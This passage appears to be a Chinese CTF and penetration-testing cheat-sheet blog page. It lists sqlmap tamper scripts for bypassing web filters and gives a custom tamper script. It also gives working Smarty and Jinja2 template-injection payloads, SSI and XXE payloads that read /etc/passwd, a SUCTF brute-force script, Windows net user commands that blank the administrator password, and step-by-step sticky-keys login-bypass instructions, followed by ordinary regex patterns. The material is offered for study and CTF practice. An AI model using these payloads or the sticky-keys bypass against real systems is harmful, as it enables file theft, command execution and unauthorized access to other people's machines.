<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">--prefix=PREFIX <span class="comment">#攻击载荷的前缀  	攻击句子的左边闭合，例如：--prefix=&quot;&#x27;)&quot;</span></span><br><span class="line">--suffix=SUFFIX <span class="comment">#攻击载荷的后缀	攻击句子的右边闭合，例如：--suffix=&quot;#&quot;</span></span><br></pre></td></tr></table></figure>

<h4 id="SQLmap内置脚本"><a href="#SQLmap内置脚本" class="headerlink" title="SQLmap内置脚本"></a>SQLmap内置脚本</h4><p>脚本调用：<code>--tamper </code> </p>
<blockquote>
<p> 注意:脚本调用是遵循顺序的，比如：</p>
<p><code>--tamper &quot;x1,x2,x3&quot;</code> </p>
<p>那么对应的，脚本会遵循从x1开始不断往后叠加脚本，比如第一个进行空格替换，第二个进行等号的替换，最后一个进行base64加密。</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#使用方法</span></span><br><span class="line">--tamper=x1,x2,x3...</span><br><span class="line"></span><br><span class="line"><span class="comment">#相关脚本</span></span><br><span class="line">常见的tamper有：</span><br><span class="line"></span><br><span class="line">apostrophemask.py 	用utf8代替引号</span><br><span class="line"></span><br><span class="line">equaltolike.py 		MSSQL * SQLite中like 代替等号</span><br><span class="line"></span><br><span class="line">greatest.py 		MySQL中绕过过滤’&gt;’ ,用GREATEST替换大于号</span><br><span class="line"></span><br><span class="line">space2hash.py 		空格替换为<span class="comment">#号 随机字符串 以及换行符</span></span><br><span class="line"></span><br><span class="line">space2comment.py	用/**/代替空格</span><br><span class="line"></span><br><span class="line">apostrophenullencode.py 	MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL绕过过滤双引号，替换字符和双引号</span><br><span class="line"></span><br><span class="line">halfversionedmorekeywords.py 	当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论</span><br><span class="line"></span><br><span class="line">space2morehash.py 	 MySQL中空格替换为 <span class="comment">#号 以及更多随机字符串 换行符</span></span><br><span class="line"></span><br><span class="line">appendnullbyte.p 	 Microsoft Access在有效负荷结束位置加载零字节字符编码</span><br><span class="line"></span><br><span class="line">ifnull2ifisnull.py 	 MySQL，SQLite (possibly)，SAP MaxDB绕过对 IFNULL 过滤</span><br><span class="line"></span><br><span class="line">space2mssqlblank.py  mssql空格替换为其它空符号</span><br><span class="line"></span><br><span class="line">base64encode.py 	 用<span class="built_in">base64</span>编码</span><br><span class="line"></span><br><span class="line">space2mssqlhash.py mssql查询中替换空格</span><br><span class="line"></span><br><span class="line">modsecurityversioned.py	 mysql中过滤空格，包含完整的查询版本注释</span><br><span class="line"></span><br><span class="line">space2mysqlblank.py	  mysql中空格替换其它空白符号</span><br><span class="line"></span><br><span class="line">between.py 	 		MS SQL 2005，MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0中用between替换大于号（&gt;）</span><br><span class="line"></span><br><span class="line">space2mysqldash.py 	 MySQL，MSSQL替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）</span><br><span class="line"></span><br><span class="line">multiplespaces.py 	 围绕SQL关键字添加多个空格</span><br><span class="line"></span><br><span class="line">space2plus.py 	  	 用+替换空格</span><br><span class="line"></span><br><span class="line">bluecoat.py 	 	 MySQL 5.1, SGOS代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换=为like</span><br><span class="line"></span><br><span class="line">nonrecursivereplacement.py 	 双重查询语句。取代predefined SQL关键字with表示 suitable <span class="keyword">for</span>替代</span><br><span class="line"></span><br><span class="line">space2randomblank.py 	 代替空格字符（“”）从一个随机的空白字符可选字符的有效集</span><br><span class="line"></span><br><span class="line">sp_password.py 	 	 追加sp_password’从DBMS日志的自动模糊处理的26 有效载荷的末尾</span><br><span class="line"></span><br><span class="line">chardoubleencode.py 	 双url编码(不处理以编码的)</span><br><span class="line"></span><br><span class="line">unionalltounion.py 	 	 替换UNION ALL SELECT UNION SELECT</span><br><span class="line"></span><br><span class="line">charencode.py 	 	 Microsoft SQL Server 2005，MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL 8.3, 8.4, 9.0url编码；</span><br><span class="line"></span><br><span class="line">randomcase.py 	 	 Microsoft SQL Server 2005，MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL 8.3, 8.4, 9.0中随机大小写</span><br><span class="line"></span><br><span class="line">unmagicquotes.py 	 宽字符绕过 GPC addslashes</span><br><span class="line"></span><br><span class="line">randomcomments.py 	 用/**/分割sql关键字</span><br><span class="line"></span><br><span class="line">charunicodeencode.py 	 ASP，ASP.NET中字符串 unicode 编码</span><br><span class="line"></span><br><span class="line">securesphere.py 	  追加特制的字符串</span><br><span class="line"></span><br><span class="line">versionedmorekeywords.py 	     MySQL &gt;= 5.1.13注释绕过</span><br><span class="line"></span><br><span class="line">halfversionedmorekeywords.py 	 MySQL &lt; 5.1中关键字前加注释</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><p>–os-shell</p>
<h4 id="部分插件"><a href="#部分插件" class="headerlink" title="部分插件"></a>部分插件</h4><p>防空格和乘法符号：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2023 sqlmap developers (https://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = retVal.replace(<span class="string">&#x27;-- -&#x27;</span>,<span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">        retVal = retVal.replace(<span class="string">&#x27; &#x27;</span>,<span class="built_in">chr</span>(<span class="number">0x0a</span>))</span><br><span class="line">        retVal = retVal.replace(<span class="string">&#x27;=&#x27;</span>,<span class="built_in">chr</span>(<span class="number">0x0a</span>)+<span class="string">&#x27;like&#x27;</span>+<span class="built_in">chr</span>(<span class="number">0x0a</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure>

<p>base64加密于解密：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密</span></span><br><span class="line">a = base64.b64encode(<span class="string">&#x27;Hello world!&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">b = base64.b64decode(a.encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h3 id="绕过方案"><a href="#绕过方案" class="headerlink" title="绕过方案"></a>绕过方案</h3><h4 id="python"><a href="#python" class="headerlink" title="python"></a>python</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 绕过空格限制的方案 </span></span><br><span class="line"><span class="built_in">chr</span>(<span class="number">0x0a</span>) <span class="comment"># 换行绕过</span></span><br><span class="line"><span class="built_in">chr</span>(<span class="number">0x09</span>) <span class="comment"># 制表符绕过</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 绕过等于号的操作</span></span><br><span class="line"><span class="built_in">chr</span>(<span class="number">0x09</span>)+<span class="string">&#x27;like&#x27;</span>+<span class="built_in">chr</span>(<span class="number">0x09</span>)		<span class="comment"># 使用空格字符+like进行绕过</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 关于base64 from_base64/to_base64</span></span><br><span class="line">#当数据库出现：</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span>from_base64($id);</span><br><span class="line">#则id必须是： to_base64(payload) 进行对payload的编码解码</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span>from_base64(to_base64(payload));</span><br></pre></td></tr></table></figure>



<h1 id="模板漏洞-模板注入"><a href="#模板漏洞-模板注入" class="headerlink" title="模板漏洞/模板注入"></a>模板漏洞/模板注入</h1><p>模板注入的位置：用户名，密码，回显的参数，UA，XFF等。</p>
<h2 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">模板漏洞判断</span><br><span class="line">$&#123;<span class="number">7</span>*<span class="number">7</span>&#125;  |==&gt;a&#123;*comment*&#125;b=|=&gt;Smarty</span><br><span class="line">        |                 |=&gt;$&#123;<span class="string">&quot;z&quot;</span>.<span class="title function_ invoke__">join</span>(<span class="string">&quot;ab&quot;</span>)&#125;=|=&gt;Mako</span><br><span class="line">        |                                      |=&gt;Unknown</span><br><span class="line">        |                        |=&gt;Jinja2</span><br><span class="line">        |==&gt;&#123;&#123;<span class="number">7</span>*<span class="number">7</span>&#125;&#125;=|=&gt;&#123;&#123;<span class="number">7</span>*<span class="string">&#x27;7&#x27;</span>&#125;&#125;=|=&gt;Twig</span><br><span class="line">                    |            |=&gt;Unknown</span><br><span class="line">                    |=&gt;Not vulnerable</span><br><span class="line">优质的Twig漏洞利用文章：https:<span class="comment">//xz.aliyun.com/t/10056#toc-12</span></span><br></pre></td></tr></table></figure>

<h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">smarty模板常用payload</span><br><span class="line">&#123;<span class="keyword">if</span> <span class="title function_ invoke__">phpinfo</span>()&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line">&#123;<span class="keyword">if</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line">&#123;<span class="keyword">if</span> <span class="title function_ invoke__">readfile</span>(<span class="string">&#x27;/flag&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125; </span><br><span class="line">&#123;<span class="keyword">if</span> <span class="title function_ invoke__">show_source</span>(<span class="string">&#x27;/flag&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line">&#123;<span class="keyword">if</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat ../../../flag&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125; </span><br><span class="line">smarty中的&#123;<span class="keyword">if</span>&#125;标签中可以执行php语句</span><br></pre></td></tr></table></figure>



<h2 id="python-1"><a href="#python-1" class="headerlink" title="python"></a>python</h2><p>参考链接：<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_51428325/article/details/121357005">https://blog.csdn.net/m0_51428325/article/details/121357005</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">思想：</span><br><span class="line">	有输入输出八成有注入点</span><br><span class="line">	登录框优先考虑爆破，注入，模板</span><br><span class="line">	__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__.__builtins__</span><br><span class="line">		组合功能相当于导入并且执行某个内置类</span><br><span class="line">		一步不能缺，__builtins__是关键的类似于函数调用的方法</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Python模板漏洞和php模板漏洞：</span><br><span class="line">    遇到的不多，暂时了解为&#123;&#123;&#125;&#125;</span><br><span class="line">    内部包裹的变量可执行。</span><br><span class="line">	第一种：利用Jinja2，利用python的很多基类</span><br><span class="line">    <span class="number">1.</span>基础类执行</span><br><span class="line">        __class__  返回类型所属的对象（类）</span><br><span class="line">        __mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">        __base__   返回的是该对象的父类(有点坑爹，常用的貌似是带s的那个)</span><br><span class="line">        __bases__  返回该对象所继承的所有基类(父类)</span><br><span class="line">        // __base__和__mro__都是用来寻找基类的</span><br><span class="line">        __subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line">        __init__  类的初始化方法</span><br><span class="line">        __globals__  对包含函数全局变量的字典的引用</span><br><span class="line">        </span><br><span class="line">	<span class="number">2.</span>常见基础调用类函数的执行</span><br><span class="line">        &gt;&gt;&gt; <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()</span><br><span class="line">        <span class="comment"># 返回子类的列表 [,,,...]</span></span><br><span class="line">        <span class="comment">#从中随便选一个类,查看它的__init__</span></span><br><span class="line">        &gt;&gt;&gt; <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">30</span>].__init__</span><br><span class="line">        &lt;slot wrapper <span class="string">&#x27;__init__&#x27;</span> of <span class="string">&#x27;object&#x27;</span> objects&gt;</span><br><span class="line">        <span class="comment"># wrapper是指这些函数并没有被重载，这时他们并不是function，不具有__globals__属性</span></span><br><span class="line">        <span class="comment">#再换几个子类，很快就能找到一个重载过__init__的类，比如</span></span><br><span class="line">        &gt;&gt;&gt; <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">5</span>].__init__</span><br><span class="line">        &gt;&gt;&gt; <span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">5</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>]</span><br><span class="line">        <span class="comment">#然后用eval执行命令即可</span></span><br><span class="line">        </span><br><span class="line">        详细参照：https://blog.csdn.net/weixin_54515836/article/details/<span class="number">113778233</span></span><br><span class="line">	上面的两种情况都有一个致命的缺点：必须带括号。</span><br><span class="line">    </span><br><span class="line">	<span class="number">3.</span>补充：</span><br><span class="line">       	__builtins__ ：包含内置函数，异常等类型</span><br><span class="line">        	运用：__builtins__.<span class="built_in">print</span>(<span class="string">&#x27;hello world&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="number">4.</span>调用补充：</span><br><span class="line">        除开 <span class="string">&#x27;&#x27;</span> 外，还有：</span><br><span class="line">        () &#123;&#125; [] </span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    不带括号的情况：参照这个大佬：https://blog.csdn.net/miuzzx/article/details/<span class="number">110220425</span></span><br><span class="line">	等式成立：</span><br><span class="line">	&#123;&#123;<span class="string">&quot;&quot;</span>.__class__&#125;&#125; == &#123;&#123;<span class="string">&quot;&quot;</span>[<span class="string">&#x27;__classs__&#x27;</span>]&#125;&#125;</span><br><span class="line">	</span><br><span class="line">    <span class="number">1.</span>url_for：动态视图函数</span><br><span class="line">        &#123;&#123;url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>]&#125;&#125;</span><br><span class="line">        &#123;&#123;url_for.__globals__.__getitem__(<span class="string">&#x27;__builtins__&#x27;</span>)&#125;&#125;</span><br><span class="line">        &#123;&#123;url_for.__globals__.pop(<span class="string">&#x27;__builtins__&#x27;</span>)&#125;&#125;</span><br><span class="line">        &#123;&#123;url_for.__globals__.get(<span class="string">&#x27;__builtins__&#x27;</span>)&#125;&#125;</span><br><span class="line">        &#123;&#123;url_for.__globals__.setdefault(<span class="string">&#x27;__builtins__&#x27;</span>)&#125;&#125;</span><br><span class="line">		eg：</span><br><span class="line">            /shrine/&#123;&#123;url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config&#125;&#125;</span><br><span class="line">	<span class="number">2.</span>其它调用：</span><br><span class="line">        &#123;&#123;&#123;&#125;.__class__.__mro__[-<span class="number">1</span>].__subclasses__()[<span class="number">102</span>].__init__.__globals__[<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line">	或者这个也行：</span><br><span class="line">	&#123;&#123;().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">75</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;open&#x27;</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br><span class="line">	&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;txt.galf_eht_si_siht/&#x27;</span>[::-<span class="number">1</span>],<span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"> 	</span><br></pre></td></tr></table></figure>

<h2 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wy_97/article/details/78165051">https://blog.csdn.net/wy_97/article/details/78165051</a></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java模板漏洞博客信息：WEB-INF/web.xml泄露</span><br><span class="line">WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line">    /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中</span><br><span class="line">    /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</span><br><span class="line">    /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。</span><br><span class="line">    /WEB-INF/database.properties：数据库配置文件</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//blog.csdn.net/wy_97/article/details/78165051</span></span><br></pre></td></tr></table></figure>

<h2 id="SSI语法–shtml"><a href="#SSI语法–shtml" class="headerlink" title="SSI语法–shtml"></a>SSI语法–shtml</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">SSI语法</span><br><span class="line"></span><br><span class="line">SHTML文件中使用SSI指令引用其他的html文件（<span class="comment">#include），此时服务器会将SHTML中包含的SSI指令解释，再传送给客户端，此时的HTML中就不再有SSI指令了。</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span>.显示服务器端环境变量&lt;<span class="comment">#echo&gt;</span></span><br><span class="line">&lt;!–<span class="comment">#echo var=&quot;DOCUMENT_NAME&quot;–&gt;		//本文档名称</span></span><br><span class="line">&lt;!–<span class="comment">#echo var=&quot;DATE_LOCAL&quot;–&gt;		//现在时间</span></span><br><span class="line">&lt;! <span class="comment">#echo var=&quot;REMOTE_ADDR&quot;–&gt;		//显示IP地址</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">2</span>.将文本内容直接插入到文档中&lt;<span class="comment">#include&gt;</span></span><br><span class="line">&lt;! <span class="comment">#include file=&quot;文件名称&quot;–&gt;</span></span><br><span class="line">&lt;!--<span class="comment">#include virtual=&quot;index.html&quot; --&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;! <span class="comment">#include virtual=&quot;文件名称&quot;–&gt;</span></span><br><span class="line">&lt;!--<span class="comment">#include virtual=&quot;/www/footer.html&quot; --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span>.显示WEB文档相关信息&lt;<span class="comment">#flastmod&gt;&lt;#fsize&gt;(如文件制作日期/大小等)</span></span><br><span class="line">&lt;! <span class="comment">#flastmod file=&quot;文件名称&quot;–&gt;		//文件最近更新日期</span></span><br><span class="line">&lt;!–<span class="comment">#fsize file=&quot;文件名称&quot;–&gt;		//文件的长度</span></span><br><span class="line"></span><br><span class="line"><span class="number">4</span>.直接执行服务器上的各种程序&lt;<span class="comment">#exec&gt;(如CGI或其他可执行程序)</span></span><br><span class="line">&lt;!–<span class="comment">#exec cmd=&quot;文件名称&quot;–&gt;</span></span><br><span class="line">&lt;!--<span class="comment">#exec cmd=&quot;cat /etc/passwd&quot;--&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!–<span class="comment">#exec cgi=&quot;文件名称&quot;–&gt;</span></span><br><span class="line">&lt;!--<span class="comment">#exec cgi=&quot;/cgi-bin/access_log.cgi&quot;–&gt;</span></span><br></pre></td></tr></table></figure>



<h2 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h2><p>大佬参照1：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/s1awwhy/p/13736633.html">https://www.cnblogs.com/s1awwhy/p/13736633.html</a></p>
<p>大佬参照2：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/lktop/p/13774088.html">https://www.cnblogs.com/lktop/p/13774088.html</a></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">admin</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;admin;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>password<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="前端绕过"><a href="#前端绕过" class="headerlink" title="前端绕过"></a>前端绕过</h1><p>寻常的游戏传参绕过：审计JS，有可能直接审出flag，或者通过浏览器审查的console窗口修改JS断点出的js参数值，拿下flag。</p>
<p>涉及：前端JS审计，谷歌浏览器断点调试。</p>
<h1 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h1><h2 id="Python-idna编码爆破脚本"><a href="#Python-idna编码爆破脚本" class="headerlink" title="Python idna编码爆破脚本"></a>Python idna编码爆破脚本</h2><p>相关题目：[SUCTF 2019]Pythonginx</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse, urlunsplit, urlsplit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getUrl</span>(<span class="params">url</span>):</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    parts = <span class="built_in">list</span>(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">&#x27;idna&#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">&#x27;.&#x27;</span>.join(newhost)</span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">&#x27; &#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">&#x27;suctf.cc&#x27;</span>:</span><br><span class="line">        <span class="built_in">print</span>(url)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65536</span>):</span><br><span class="line">    c = <span class="built_in">chr</span>(x)</span><br><span class="line">    <span class="comment"># 测试每数字所转字符串是否符合源码的条件</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># 条件吻合再输出</span></span><br><span class="line">        <span class="keyword">if</span> getUrl(<span class="string">&quot;file://suctf.c&#123;&#125;/&quot;</span>.<span class="built_in">format</span>(c)):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;str: &quot;</span> + c + <span class="string">&quot; unicode: \\u&quot;</span> + <span class="built_in">str</span>(<span class="built_in">hex</span>(x))[<span class="number">2</span>:])</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="windows专题"><a href="#windows专题" class="headerlink" title="windows专题"></a>windows专题</h1><p>hosts文件位置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\drivers\etc</span><br></pre></td></tr></table></figure>

<h2 id="cmd命令"><a href="#cmd命令" class="headerlink" title="cmd命令"></a>cmd命令</h2><p>CMD 工具路径：c:\windows\system32\cmd</p>
<p>用户账户密码存储位置：c:\windows\system32\config\SAM</p>
<p>修改账户密码：net user 用户名 新密码</p>
<p>创建一个新用户：net user 用户名 新密码 /add</p>
<p>删除用户：net user 用户名 /del</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 修改账户的密码</span></span><br><span class="line">net user administrator <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># 新增账户</span></span><br><span class="line">net user <span class="built_in">test</span> <span class="built_in">test</span> /add</span><br><span class="line"><span class="comment"># 新增别的账户</span></span><br><span class="line">net user administrator <span class="built_in">test</span> /add</span><br></pre></td></tr></table></figure>

<h2 id="shift连按五次的滞留键攻击"><a href="#shift连按五次的滞留键攻击" class="headerlink" title="shift连按五次的滞留键攻击"></a>shift连按五次的滞留键攻击</h2><blockquote>
<p>测试版本信息：Windows7</p>
<p>Windows的软件：cmd.exe，sethc.exe</p>
</blockquote>
<ol>
<li>计算机开屏，还没输入账密时，连按5次shift，弹出【您的计算机无法启动】=&gt; 【启动修复】=&gt; [取消]</li>
<li>等待一段时间后会出现【启动修复】并且表示【是否发送信息】，在这里要选择【查看问题详细信息】，点击第二个链接【本地脱机】访问</li>
<li>本地脱机访问成功后会来到默认的文本文件打开窗口，通过这个窗口，点击【编辑】=&gt; 【打开】=》【Windows/System32】</li>
<li>选择打开全部文件，将原本 <code>sethc.exe</code> 修改为 <code>123.exe</code> ,将 <code>cmd.exe</code> 修改为  <code>sethc.exe</code>  .</li>
<li>关掉所有页面重启计算机，再次按下五次shift触发cmd窗口。</li>
<li>修改密码 <code>net user administrator &quot;&quot;</code> 并且进行无密码登录即可进入系统。</li>
</ol>
<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><h2 id="某些通用格式匹配"><a href="#某些通用格式匹配" class="headerlink" title="某些通用格式匹配"></a>某些通用格式匹配</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/fozero/p/7868687.html">https://www.cnblogs.com/fozero/p/7868687.html</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">一、校验数字的表达式</span><br><span class="line">1. 数字：^[0-9]*$</span><br><span class="line">2. n位的数字：^\d&#123;n&#125;$</span><br><span class="line">3. 至少n位的数字：^\d&#123;n,&#125;$</span><br><span class="line">4. m-n位的数字：^\d&#123;m,n&#125;$</span><br><span class="line">5. 零和非零开头的数字：^(0|[1-9][0-9]*)$</span><br><span class="line">6. 非零开头的最多带两位小数的数字：^([1-9][0-9]*)+(.[0-9]&#123;1,2&#125;)?$</span><br><span class="line">7. 带1-2位小数的正数或负数：^(\-)?\d+(\.\d&#123;1,2&#125;)?$</span><br><span class="line">8. 正数、负数、和小数：^(\-|\+)?\d+(\.\d+)?$</span><br><span class="line">9. 有两位小数的正实数：^[0-9]+(.[0-9]&#123;2&#125;)?$</span><br><span class="line">10. 有1~3位小数的正实数：^[0-9]+(.[0-9]&#123;1,3&#125;)?$</span><br><span class="line">11. 非零的正整数：^[1-9]\d*$ 或 ^([1-9][0-9]*)&#123;1,3&#125;$ 或 ^\+?[1-9][0-9]*$</span><br><span class="line">12. 非零的负整数：^\-[1-9][]0-9<span class="string">&quot;*$ 或 ^-[1-9]\d*$</span></span><br><span class="line"><span class="string">13. 非负整数：^\d+$ 或 ^[1-9]\d*|0$</span></span><br><span class="line"><span class="string">14. 非正整数：^-[1-9]\d*|0$ 或 ^((-\d+)|(0+))$</span></span><br><span class="line"><span class="string">15. 非负浮点数：^\d+(\.\d+)?$ 